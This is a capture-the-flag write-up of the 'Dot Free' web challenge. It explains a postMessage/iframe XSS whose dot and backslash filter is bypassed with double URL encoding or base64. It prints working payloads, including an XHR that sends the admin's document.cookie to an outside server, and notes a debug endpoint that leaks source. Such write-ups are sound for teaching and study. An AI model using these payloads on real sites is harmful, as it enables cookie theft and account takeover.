# Dot Free

By taking a look at  the challenge, it basically tries to send some messages between an iframe and window. Javascript on page, takes the query part of URI using `location.search.substr(1)` and decodes the URL encoding applied by browser, then it will be passed to JSON parse.  
Then `EventListener` on message receives the sent message on `window.load` action. Then it retrieves the objects data using e.data... We can find the structure of JSON by going through the way it parses received JSON object. The first key is `iframe` and it should have `value` key inside. The value of iframe object is the src data of this object. But, it perform checks for existence of any dot or back slash, and in case of any match, it will ignore the payload.  
After that, it will send the iframe src value to `lls()` function which will consequently append it as a Javascript tag in the body of loaded page.  

Therefore, the first payload I tested was a simple alert to make sure idea is working:  

http://13.57.104.34/?{%22iframe%22:{%22value%22:%22data:text/html,alert(window%252edocument%252edomain);%22}}  

Awesome, we got domain name!! Challenge is pretty straightforward and may be flag is in the `document.cookie` of admin. So, let’s grab it!  

As you see I double encoded any dot (`%2e`) and slash (`%2f`) which results in:  
> `: →  %25%2e, \ → %25%2f`  

http://13.57.104.34/?{%22iframe%22:{%22value%22:%22data:text/html,var%20xhr=new%20XMLHttpRequest();xhr%252eopen(%27GET%27,%20%27http:%252f%252f35%252e226%252e92%252e164/cookie%252ephp?c=%27%20+%20window%252edocument%252ecookie,true);xhr%252esend();%22}}

Shortly, I received flag in the log files of my server...  
`flag=rwctf{L00kI5TheFlo9}`  

> Note_1: I could even use base64 encoding instead of double encoding of my payload:
> > http://13.57.104.34/?{"iframe":{"value":"data:text/html;base64,dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTt4aHIub3BlbignR0VUJywgJ2h0dHA6Ly8zNS4yMjYuOTIuMTY0L2Nvb2tpZS5waHA/Yz0nICsgd2luZG93LmRvY3VtZW50LmNvb2tpZSx0cnVlKTt4aHIuc2VuZCgpOw=="}}  

> Note_2: your server has another bug which leaks parts of source code because of debugging stuff:  

```
POST /Recieve/ HTTP/1.1
Host: 13.57.104.34

url[]=
```  

`https://pastebin.com/rL9BVZMY`  

Sincerely,  
@pwnslinger :shell: :fish: (@shellphish)  
